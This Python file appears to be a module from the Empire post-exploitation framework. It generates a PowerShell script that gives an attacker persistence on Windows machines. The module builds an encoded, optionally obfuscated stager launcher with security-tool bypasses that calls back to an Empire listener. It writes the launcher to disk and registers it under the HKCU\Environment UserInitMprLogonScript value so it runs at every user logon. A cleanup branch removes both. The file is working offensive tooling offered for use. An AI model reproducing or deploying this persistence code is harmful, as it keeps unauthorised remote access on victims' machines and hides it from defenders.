from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        listener_name = params["Listener"]
        language = params["Language"]
        script_path = params["ScriptPath"]
        cleanup = params["Cleanup"]
        obf = params["Obfuscate"].lower() == "true"
        obf_cmd = params["ObfuscateCommand"]
        bypasses = params["Bypasses"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]

        if cleanup.lower() == "true":
            script = "$scriptFile = $ExecutionContext.InvokeCommand.ExpandString('"
            script += script_path + "');\n"
            script += (
                "Remove-Item -Path $scriptFile -Force -ErrorAction SilentlyContinue;\n"
            )
            script += "$regResult = REG.exe DELETE 'HKCU\\Environment' /v UserInitMprLogonScript /f 2>&1;\n"
            script += 'if ($LASTEXITCODE -ne 0) { Write-Output "[-] REG.exe DELETE failed: $regResult" }\n'
            script += "else { Write-Output '[+] Logon script persistence removed.' }"

            return main_menu.modulesv2.finalize_module(
                script=script,
                script_end="",
                obfuscate=obfuscate,
                obfuscation_command=obfuscation_command,
            )

        if not listener_name:
            raise ModuleValidationException("Listener is required.")

        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            raise ModuleValidationException(f"[!] Invalid listener: {listener_name}")

        lang = language.lower()
        try:
            if lang == "powershell":
                launcher = main_menu.stagergenv2.generate_launcher(
                    listener_name=listener_name,
                    language="powershell",
                    encode=True,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    user_agent=user_agent,
                    proxy=proxy,
                    proxy_creds=proxy_creds,
                    bypasses=bypasses,
                )
            elif lang in ("csharp", "ironpython"):
                launcher = main_menu.stagergenv2.generate_exe_oneliner(
                    language=lang,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    encode=True,
                    listener_name=listener_name,
                )
            elif lang == "go":
                launcher = main_menu.stagergenv2.generate_go_exe_oneliner(
                    language=lang,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    encode=True,
                    listener_name=listener_name,
                )
            else:
                raise ModuleValidationException(f"Language '{language}' not supported.")
        except ModuleValidationException:
            raise
        except Exception as e:
            raise ModuleValidationException(
                f"[!] Launcher generation failed for {language}: {e}"
            ) from e

        if not launcher or not launcher.strip():
            raise ModuleValidationException("[!] Error in launcher command generation.")

        script = "$scriptFile = $ExecutionContext.InvokeCommand.ExpandString('"
        script += script_path + "');\n"
        # Escape single quotes for PowerShell single-quoted string context
        script += "[System.IO.File]::WriteAllText($scriptFile, '"
        script += launcher.replace("'", "''") + "');\n"
        script += "Write-Output '[+] Created logon script:' $scriptFile;\n"
        script += "$regResult = REG.exe ADD 'HKCU\\Environment' /v UserInitMprLogonScript /t REG_SZ /d $scriptFile /f 2>&1;\n"
        script += 'if ($LASTEXITCODE -ne 0) { Write-Output "[-] REG.exe ADD failed: $regResult" }\n'
        script += (
            "else { Write-Output '[+] Set UserInitMprLogonScript registry value.' };\n"
        )
        script += "$regVal = (Get-ItemProperty -Path 'HKCU:\\Environment' -Name 'UserInitMprLogonScript' -ErrorAction SilentlyContinue).UserInitMprLogonScript;\n"
        script += 'if ($regVal) { Write-Output "[+] Verified: UserInitMprLogonScript = $regVal" }\n'
        script += "else { Write-Output '[-] Failed to verify registry value.' }"

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
